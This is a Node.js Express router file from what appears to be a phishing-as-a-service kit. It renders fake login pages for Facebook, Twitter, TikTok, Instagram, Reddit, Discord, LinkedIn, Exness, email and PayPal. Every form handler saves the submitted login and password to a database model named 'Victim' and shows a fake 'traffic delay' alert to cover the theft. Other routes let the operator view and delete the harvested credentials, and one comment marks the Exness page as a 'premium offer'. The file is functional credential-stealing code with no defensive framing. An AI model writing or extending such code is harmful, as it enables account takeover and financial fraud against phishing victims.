const express = require('express');
const Victim = require('../models/Victim');
const router = express.Router();











// Facebook page route
router.get('/facebook', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('facebook', { userId });
});

router.post('/submit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Facebook' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Facebook victim details:', err);
        res.status(500).send('Error processing request');
    }
});

// View victims page with data specific to logged-in user
router.get('/view-victims', async (req, res) => {
    const userId = req.session.userId; // Retrieve logged-in user's ID from session

    if (!userId) {
        return res.status(401).send("Unauthorized");
    }

    try {
        const victims = await Victim.find({ userId }); // Fetch victims for the specific user
        res.render('view-victims', { victims });
    } catch (err) {
        console.error('Error loading victims:', err);
        res.status(500).send('Error loading victims');
    }
});

// Delete victim entry by ID
router.post('/delete-victim/:id', async (req, res) => {
    const victimId = req.params.id;

    try {
        await Victim.findByIdAndDelete(victimId);
        res.redirect('/view-victims');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error deleting data');
    }
});



// Twitter page route
router.get('/twitter', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('twitter', { userId });
});

//Route to Handle Twitter Form Submission
router.post('/submit-twitter-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Twitter' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Twitter victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// TikTok route
router.get('/tiktok', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('tiktok', { userId });
});

// Route to handle TikTok form submission
router.post('/submit-tiktok-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'TikTok' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving TikTok victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// INSTAGRAM page route
// Route to display the Instagram login page
router.get('/instagram', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('instagram', { userId });
});

// Route to handle Instagram form submission
router.post('/submit-instagram-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Instagram' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Instagram victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// REDDIT ROUTE
// Route to display the Reddit login page
router.get('/reddit', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('reddit', { userId });
});

// Route to handle Reddit form submission
router.post('/submit-reddit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Reddit' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Reddit victim details:', err);
        res.status(500).send('Error processing request');
    }
});





// DISCORD ROUTE
// Route to display the Discord login page
router.get('/discord', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('discord', { userId });
});

// Route to handle Discord form submission
router.post('/submit-discord-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Discord' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Discord victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// Linked in ROUTE
// Route to display the LinkedIn login page
router.get('/linkedin', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('linkedin', { userId });
});

// Route to handle LinkedIn form submission
router.post('/submit-linkedin-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'LinkedIn' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving LinkedIn victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// PART OF PREMIUM OFFER 

// Route to display the Exness login page
router.get('/exness', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('exness', { userId });
});

// Route to handle Exness form submission
router.post('/submit-exness-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Exness' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Exness victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// email route 
// Route to display the Email login page
router.get('/email', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('email', { userId });
});

// Route to handle Email form submission
router.post('/submit-email-details', async (req, res) => {
    const { userId, email, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'Email' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Email victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// paypal route 
// Route to display the PayPal login page
router.get('/paypal', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('paypal', { userId });
});

// Route to handle PayPal form submission
router.post('/submit-paypal-details', async (req, res) => {
    const { userId, email, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'PayPal' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving PayPal victim details:', err);
        res.status(500).send('Error processing request');
    }
});







module.exports = router;
